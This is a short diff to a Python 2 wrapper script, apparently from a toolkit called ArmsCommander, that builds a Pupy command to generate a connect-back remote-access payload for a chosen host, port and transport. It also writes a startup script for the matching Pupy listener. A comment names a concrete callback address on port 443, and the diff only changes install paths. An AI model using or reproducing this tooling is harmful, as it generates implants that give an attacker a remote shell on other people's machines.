@@ -101,7 +101,7 @@ host_Transport = str(raw_input("Enter the TRANSPORT (PROTOCOL)"))
 # type cp -r (while in directory) ./* /root/ArmsCommander (second pupy directory tree)
 # need to know this for the installer wizard
     # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
-cmd_String = "python /root/ArmsCommander/pupy/pupy/pupygen.py -f %s connect --host %s:%s -t %s" % (
+cmd_String = "python /root/pupy/pupy/pupygen.py -f %s connect --host %s:%s -t %s" % (
     payload_Selected,
     host_Connectback,
     host_Port,
@@ -115,7 +115,7 @@ print colored('Your server that it is set to listen on is %s','red','on_white') 
 print colored('Your port that the payload is to connect back to is %s','red','on_white') % host_Port
 print 'Remember all of this when you are going to start up your listener, handle just as if it was a regular Metasploit listener'
 # Generates a script file that will run Pupy Server with the correct parameters
-premade_startup_script_string = "sudo python /root/ArmsCommander/pupysh.py -t " + transport_Dict[host_Transport] + ' -p ' + host_Port
+premade_startup_script_string = "sudo python /root/pupy/pupy/pupysh.py -t " + transport_Dict[host_Transport] + ' -p ' + host_Port
 premade_startup_script_location = "/root/ArmsCommander/pupy_server_startup.sh"
 saved_startup_file = open(premade_startup_script_location, 'w')
 saved_startup_file.write(premade_startup_script_string)
